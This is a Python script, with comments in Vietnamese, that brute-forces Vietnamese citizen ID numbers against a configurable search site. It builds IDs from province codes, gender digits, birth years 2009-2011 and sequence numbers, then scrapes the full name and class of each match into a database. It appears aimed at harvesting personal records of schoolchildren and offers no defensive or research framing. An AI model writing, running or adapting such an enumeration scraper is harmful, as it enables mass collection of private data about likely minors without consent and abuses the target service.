import os
import time
import requests
from bs4 import BeautifulSoup
import psycopg2
from dotenv import load_dotenv

load_dotenv()

DATABASE_URL = os.getenv("DATABASE_URL")
TARGET_URL_SITE = os.getenv("TARGET_URL_SITE", "https://example.com/search?q={cccd}")

# 20 Tỉnh thành phố trọng điểm / đông dân cư nhất
TARGET_PROVINCES = [
    "001", "079", "031", "048", "092", "074", "075", "040", "038", "035", 
    "027", "030", "036", "034", "077", "042", "019", "025", "024", "026"
]

# Thứ tự năm ưu tiên: 11 -> 10 -> 09
YEARS = ["11", "10", "09"]     

# Giới tính: 2 trước, 3 sau
GENDERS = ["2", "3"]          

HARDCODE_MAX_LIMIT = 80000    
REQUEST_DELAY = 0.03          

def get_db_connection():
    if not DATABASE_URL:
        return None
    try:
        return psycopg2.connect(DATABASE_URL)
    except:
        return None

def init_db():
    conn = get_db_connection()
    if not conn:
        return
    try:
        cur = conn.cursor()
        cur.execute("""
            CREATE TABLE IF NOT EXISTS scanned_records (
                id SERIAL PRIMARY KEY,
                full_name TEXT NOT NULL,
                class_name TEXT,
                cccd VARCHAR(12) UNIQUE NOT NULL,
                scanned_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
        """)
        cur.execute("""
            CREATE TABLE IF NOT EXISTS scan_progress (
                id INT PRIMARY KEY,
                province VARCHAR(3) NOT NULL,
                year VARCHAR(2) NOT NULL,
                gender VARCHAR(1) NOT NULL,
                current_seq INT NOT NULL,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
        """)
        cur.execute("SELECT COUNT(*) FROM scan_progress WHERE id = 1;")
        if cur.fetchone()[0] == 0:
            cur.execute(
                "INSERT INTO scan_progress (id, province, year, gender, current_seq) VALUES (1, %s, %s, %s, %s);",
                (TARGET_PROVINCES[0], YEARS[0], GENDERS[0], 0)
            )
        conn.commit()
        cur.close()
        conn.close()
    except Exception as e:
        print(f"[!] Worker Init DB Error: {e}")

def get_db_progress():
    conn = get_db_connection()
    if not conn:
        return TARGET_PROVINCES[0], YEARS[0], GENDERS[0], 0
    try:
        cur = conn.cursor()
        cur.execute("SELECT province, year, gender, current_seq FROM scan_progress WHERE id = 1;")
        row = cur.fetchone()
        cur.close()
        conn.close()
        if row:
            return row[0], row[1], row[2], row[3]
    except:
        pass
    return TARGET_PROVINCES[0], YEARS[0], GENDERS[0], 0

def save_db_progress(prov, year, gender, seq):
    conn = get_db_connection()
    if not conn:
        return
    try:
        cur = conn.cursor()
        cur.execute(
            "UPDATE scan_progress SET province = %s, year = %s, gender = %s, current_seq = %s, updated_at = CURRENT_TIMESTAMP WHERE id = 1;",
            (prov, year, gender, seq)
        )
        conn.commit()
        cur.close()
        conn.close()
    except:
        pass

def save_to_neon(full_name, class_name, cccd):
    conn = get_db_connection()
    if not conn:
        return
    try:
        cur = conn.cursor()
        cur.execute(
            "INSERT INTO scanned_records (full_name, class_name, cccd) VALUES (%s, %s, %s) ON CONFLICT (cccd) DO NOTHING;",
            (full_name, class_name, cccd)
        )
        conn.commit()
        cur.close()
        conn.close()
    except:
        pass

def main():
    print("[i] Background Scanner Worker đang khởi động...")
    init_db()
    
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) OptimizedWorker"}

    while True:
        try:
            cur_prov, cur_year, cur_gender, cur_seq = get_db_progress()
            
            # An toàn: Nếu tỉnh cũ không nằm trong danh sách mới, reset về đầu
            try:
                prov_idx = TARGET_PROVINCES.index(cur_prov)
            except ValueError:
                prov_idx = 0
                cur_prov, cur_year, cur_gender, cur_seq = TARGET_PROVINCES[0], YEARS[0], GENDERS[0], 0
                save_db_progress(cur_prov, cur_year, cur_gender, cur_seq)

            print(f"[i] Đang quét - Tỉnh: {cur_prov} | Năm: {cur_year} | Giới tính: {cur_gender} | Seq: {cur_seq}")

            # 1. Vòng lặp TỈNH
            for p_i in range(prov_idx, len(TARGET_PROVINCES)):
                prov = TARGET_PROVINCES[p_i]
                
                try:
                    start_y_idx = YEARS.index(cur_year) if (prov == cur_prov and cur_year in YEARS) else 0
                except ValueError:
                    start_y_idx = 0
                
                # 2. Vòng lặp NĂM (11 -> 10 -> 09)
                for y_i in range(start_y_idx, len(YEARS)):
                    year = YEARS[y_i]
                    
                    try:
                        start_g_idx = GENDERS.index(cur_gender) if (prov == cur_prov and year == cur_year and cur_gender in GENDERS) else 0
                    except ValueError:
                        start_g_idx = 0
                    
                    # 3. Vòng lặp GIỚI TÍNH (2 -> 3)
                    for g_i in range(start_g_idx, len(GENDERS)):
                        gender = GENDERS[g_i]
                        
                        if prov == cur_prov and year == cur_year and gender == cur_gender:
                            seq_start = cur_seq
                            cur_prov, cur_year, cur_gender = "", "", "" 
                        else:
                            seq_start = 0

                        # 4. Vòng lặp CHUỖI SỐ (0 -> 80000)
                        for seq in range(seq_start, HARDCODE_MAX_LIMIT + 1):
                            cccd = f"{prov}{gender}{year}{seq:06d}"
                            save_db_progress(prov, year, gender, seq)
                            
                            url = TARGET_URL_SITE.format(cccd=cccd)
                            try:
                                response = requests.get(url, headers=headers, timeout=10)
                                if response.status_code == 200:
                                    soup = BeautifulSoup(response.text, 'html.parser')
                                    table = soup.find('table', class_='qitc-bang')
                                    if table:
                                        rows = table.find_all('tr')
                                        for row in rows:
                                            cols = row.find_all('td')
                                            if len(cols) >= 4:
                                                full_name = cols[2].get_text(strip=True)
                                                class_name = cols[3].get_text(strip=True)
                                                save_to_neon(full_name, class_name, cccd)
                                                print(f"[+] Trúng! CCCD: {cccd} - {full_name} | {class_name}")
                                                break
                            except:
                                time.sleep(1)
                            
                            time.sleep(REQUEST_DELAY)

            print("[i] Hoàn tất toàn bộ chu kỳ 20 tỉnh, nghỉ 60s rồi lặp lại...")
            time.sleep(60)

        except Exception as e:
            print(f"[!] Lỗi worker: {e}. Thử lại sau 5s...")
            time.sleep(5)

if __name__ == "__main__":
    main()
